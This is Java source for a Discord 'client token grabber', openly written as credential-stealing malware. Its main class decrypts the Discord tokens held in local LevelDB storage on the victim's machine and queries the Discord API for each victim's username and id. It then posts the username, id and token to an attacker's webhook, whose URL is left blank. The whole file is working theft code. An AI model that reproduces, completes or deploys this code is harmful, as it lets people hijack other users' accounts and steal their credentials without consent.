package main.java.clienttokengrabber;

import java.nio.file.Paths;
import java.util.Set;
import java.util.HashSet;

import main.java.clienttokengrabber.utils.Decryptor;
import main.java.clienttokengrabber.utils.FileManager;
import main.java.clienttokengrabber.utils.Json;
import main.java.clienttokengrabber.utils.Requests;

public class ClientTokenGrabber {
    private static Set<String> tokens = new HashSet<>();
    public static final String WEBHOOK_URL = "";
    public static final String USER_INFO_URL = "https://discordapp.com/api/v9/users/@me";

    public static void main(String[] args) {
        getClientTokens();
        for (String token : tokens) {
            System.out.println("Token: " + token);

            String userInfo = Requests.get(token, USER_INFO_URL);
            if (userInfo != null) {
                Json userInfoJson = new Json(userInfo);
                String username = userInfoJson.valueOf("username");
                String id = userInfoJson.valueOf("id");
                String jsonPayload = "{\"content\":\"```" + username + " " + id + " " + token + "```\"}";
                Requests.post(jsonPayload, WEBHOOK_URL);
                System.out.println("User Info: " + userInfo);
            }
        }

        System.exit(0);
    }

    private static void getClientTokens() {
        FileManager.getDefaultPaths().forEach(path ->
            tokens.addAll(Decryptor.decryptTokens(
                    Paths.get(path, "Local Storage", "leveldb").toString(),
                    Decryptor.getAESKey(path))
            )
        );
    }
}